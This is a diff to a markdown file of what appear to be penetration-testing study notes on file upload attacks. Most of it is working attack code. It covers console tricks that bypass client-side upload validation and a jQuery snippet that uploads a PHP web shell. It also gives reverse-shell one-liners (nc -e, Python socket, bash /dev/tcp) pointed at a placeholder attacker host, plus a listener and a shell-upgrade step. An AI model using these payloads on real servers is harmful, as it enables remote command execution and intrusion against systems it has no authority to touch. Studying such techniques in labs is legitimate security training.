@@ -8,20 +8,98 @@ File Upload Attacks
     Key restrictions:
         accept=".jpg,.jpeg,.png" → This prevents non-image file selection.
         onChange="showImage()" → This executes a function when a file is selected.
+
     🔥 Step 2: Modify the HTML Directly in the Browser
-        **input type="file" name="uploadFile" id="uploadFile" onChange="showImage()"**
+        <input type="file" name="uploadFile" id="uploadFile" onChange="showImage()">
         Remove .jpg, .jpeg, .png so you can select .php files.
+
     🔥 Step 3: Override JavaScript via Console
     document.getElementById('uploadFile').removeAttribute('accept');
         and
     document.getElementById('uploadFile').click();
+
     🔥 Step 4: Manually Submit the Form
     If JavaScript still prevents you from submitting, force it:
     document.getElementById('uploadForm').submit();
     This bypasses the JavaScript checks and sends the file directly to upload.php.
 
+- 🚀 Alternative 2: Bypass the Validation
+    🔥 Method 1: Disable JavaScript Validation
+    validate = function() { return true; }; // Overrides the validation function
+    $("#submit").attr("disabled", false); // Re-enable the submit button
 
+    🚀 Step 2: Modify upload() to Accept Any File
+    var fd = new FormData();
+    fd.append('uploadFile', new File(["<?php system($_GET['cmd']); ?>"], "shell.php", {type: "application/x-php"}));
+
+    $.ajax({
+        url: 'upload.php',
+        type: 'post',
+        data: fd,
+        contentType: false,
+        processData: false,
+        success: function () {
+            console.log("Shell uploaded!");
+        }
+    });
+
+    🚀 Step 3: Manually Submit the Form Without Validation
+    $("#uploadForm").off('submit'); // Remove preventDefault()
+    $("#uploadForm").submit(); // Manually submit
+
+    🚀 Try a Web Shell Instead 🚀
+    <?php
+    if(isset($_GET['cmd'])) {
+        system($_GET['cmd']);
+    }
+    ?>
     
-
+    Visit: http://targetIP:targetPort/profile_images/webshell.php?cmd=whoami
     
+    🚀Enumerate Available Commands
+    If you get the web shell working, check what commands are available:
 
+    profile_images/webshell.php?cmd=which nc
+    profile_images/webshell.php?cmd=which python
+    profile_images/webshell.php?cmd=which bash
+    ✅ If nc or python is available, you can generate a new reverse shell.
+    
+    🚀 Check for Available Commands
+        /profile_images/test.php?cmd=which nc
+        /profile_images/test.php?cmd=which python3
+        /profile_images/test.php?cmd=which bash
+        /profile_images/test.php?cmd=which perl
+        /profile_images/test.php?cmd=which php
+
+    🚀Get a Reverse Shell
+    1️⃣ Using nc (Netcat)
+    If nc is available, use this:
+
+    profile_images/test.php?cmd=nc -e /bin/sh IPHOST 1234
+    2️⃣ Using Python
+    If python3 is available, use:
+
+
+    /profile_images/test.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPHOST",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+    Then, start the listener:
+    nc -lvnp 1234
+    
+    ✅ If successful, you'll get a Python shell!
+
+    3️⃣ Using Bash
+    If bash is available, try:
+
+    /profile_images/test.php?cmd=bash -i >& /dev/tcp/IPHost/1234 0>&1
+    Start the listener:
+
+    nc -lvnp 1234
+    ✅ If successful, you’ll get a Bash shell!
+
+    🚀 Upgrade to a Fully Interactive Shell
+    Once you get a connection, upgrade it to a full interactive shell:
+
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
+    export TERM=xterm
+    
+        This will allow tab completion, arrow keys, and a better terminal experience.
